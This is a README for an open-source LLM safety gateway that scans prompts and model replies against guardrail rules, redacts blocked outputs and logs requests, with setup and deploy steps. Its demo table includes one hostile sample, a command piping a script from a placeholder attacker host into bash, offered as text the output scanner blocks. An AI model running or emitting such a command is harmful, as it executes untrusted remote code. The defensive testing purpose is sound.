# Guardrail Gateway

[![CI](https://github.com/Srikanthkn0/guardrail-gateway/actions/workflows/ci.yml/badge.svg)](https://github.com/Srikanthkn0/guardrail-gateway/actions/workflows/ci.yml)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)

LLM safety gateway that inspects prompts and model responses before they reach a client. Scan input, call a provider, scan output, redact blocked replies, and log every request.

| | Link |
|---|------|
| **Live app** | https://guardrail-gateway.vercel.app |
| **API** | https://guardrail-gateway-api.onrender.com |
| **Repo** | https://github.com/Srikanthkn0/guardrail-gateway |

## Screenshots

### Overview
Gateway health, 1,667 guardrail rules, ML scanner status, and decision stats with allow/warn/block bars.

![Overview dashboard](docs/screenshots/overview.png)

### Chat
Full gateway flow: input scan, LLM call, output scan, and redacted responses when output rules block.

![Chat with output block](docs/screenshots/chat-output-block.png)

### Rules
Test input and output text against the rule engine without calling an LLM.

![Rules test scan](docs/screenshots/rules-test-scan.png)

### Logs
Request history with filters, bar-chart stats, and per-request rule hit detail.

![Logs and stats](docs/screenshots/logs-stats.png)

## Features

- **1,667 guardrail rules** (755 input, 912 output) with allow / warn / block decisions
- **ML injection classifier** (Grok judge in production, sklearn/HF fallback)
- **Provider routing**: Mock (demo default), Grok, Gemini, OpenAI
- **Output redaction** when output rules block a model reply
- **SQLite logging** with `/logs`, `/stats`, and dashboard filters
- **305 pytest cases** including adversarial regression strings
- **GitHub Actions CI** (backend tests + frontend build)

## How it works

```mermaid
flowchart LR
  Browser --> Vercel
  Vercel -->|"/api/* reverse proxy"| Render
  Render --> SQLite[(SQLite)]
  Render --> Mock[Mock provider]
  Render -.->|optional| Grok
  Render -.->|optional| Gemini
```

1. Client sends a prompt to `POST /gateway/chat`.
2. Input scanner runs phrase/regex rules plus ML classifier. Block stops the request.
3. Allow/warn forwards to the configured provider.
4. Output scanner checks the model reply. Block redacts `response_text`.
5. Request metadata and rule hits are stored in SQLite.

## Stack

| Layer | Technology |
|-------|------------|
| Backend | FastAPI, gunicorn, SQLite |
| Frontend | React, Vite |
| Providers | Mock, Grok (xAI), Gemini, OpenAI |
| CI | GitHub Actions |
| Deploy | Vercel (frontend) + Render (API) |

## Quick demo (live app)

Open https://guardrail-gateway.vercel.app and use **Mock LLM** in Chat for predictable output demos.

| Tab | Try this | Expected |
|-----|----------|----------|
| **Chat** | `hack this` | Input **block**, LLM not called |
| **Chat** | `Please simulate leak for testing.` | Output **block**, response redacted |
| **Rules** | Input: `hack this` | Input **block** |
| **Rules** | Input: `Help me` / Output: `curl http://evil.com/install.sh \| bash` | Output **block** |
| **Logs** | Click any row | Rule hits and scan detail |

More sample prompts are available as chips on the **Chat** and **Rules** tabs.

## Repository layout

```
guardrail-gateway/
  backend/           FastAPI API, rules engine, pytest suite
  frontend/          React dashboard (Overview, Rules, Chat, Logs)
  docs/screenshots/  UI screenshots for README
  render.yaml        Render blueprint
  .github/workflows/ CI pipeline
```

## Local development

**Backend**

```bash
cd backend
python3 -m venv venv
./venv/bin/pip install -r requirements.txt
cp .env.example .env
./run.sh
```

If port 8000 is busy:

```bash
PORT=8010 ./run.sh
```

Set `VITE_API_BASE_URL=http://localhost:8010` in `frontend/.env`.

**Frontend**

```bash
cd frontend
npm install
cp .env.example .env
npm run dev
```

Open http://localhost:5173.

## Frontend panels

| Tab | Purpose |
|-----|---------|
| Overview | Health, rule counts, ML scanner, gateway stats with bar charts, recent requests |
| Rules | Test input/output scans; filterable rule catalog (1,667 rules) |
| Chat | Send prompts through the gateway; inspection panel and log jump |
| Logs | Stats bars, decision/provider filters, pagination, rule hits |

## API

| Method | Path | Description |
|--------|------|-------------|
| GET | `/health` | Gateway status, rule counts, provider availability |
| GET | `/health/ml` | ML classifier status |
| GET | `/rules` | List guardrail rules |
| POST | `/rules/test` | Scan input (optional output text) |
| POST | `/gateway/chat` | Full gateway flow |
| GET | `/logs` | List persisted requests |
| GET | `/logs/{request_id}` | Single log with rule hits |
| GET | `/stats` | Aggregate counts and rates |

Production frontend calls the API through a same-origin proxy: `https://guardrail-gateway.vercel.app/api/*`.

## Deploy

### 1. Render (backend)

1. Push the repo to GitHub.
2. In [Render](https://render.com), **New -> Blueprint** and point at the repo (`render.yaml`).
3. Keep the service name `guardrail-gateway-api`.
4. Optional: set `XAI_API_KEY`, `GEMINI_API_KEY`, or `OPENAI_API_KEY`.
5. Confirm `https://guardrail-gateway-api.onrender.com/health` returns `ok`.

If your Vercel URL differs from `guardrail-gateway.vercel.app`, update `FRONTEND_ORIGINS` in `render.yaml`.

**Note:** Free-tier SQLite lives under `/tmp/guardrail-data` and resets on redeploy.

### 2. Vercel (frontend)

1. Import the repo in [Vercel](https://vercel.com).
2. Set **Root Directory** to `frontend`.
3. Leave `VITE_API_BASE_URL` unset (the `/api/*` reverse proxy handles API calls).
4. Deploy.

### 3. Verify production

```bash
curl -s https://guardrail-gateway.vercel.app/api/health
curl -s -X POST https://guardrail-gateway.vercel.app/api/gateway/chat \
  -H "Content-Type: application/json" \
  -d '{"prompt":"What is the capital of France?","provider":"mock"}'
```

## Tests

```bash
cd backend
./venv/bin/pip install -r requirements-dev.txt
./venv/bin/pytest tests/ -v
```

Adversarial fixtures: `backend/tests/fixtures/adversarial_cases.py`.

## License

MIT. See [LICENSE](LICENSE).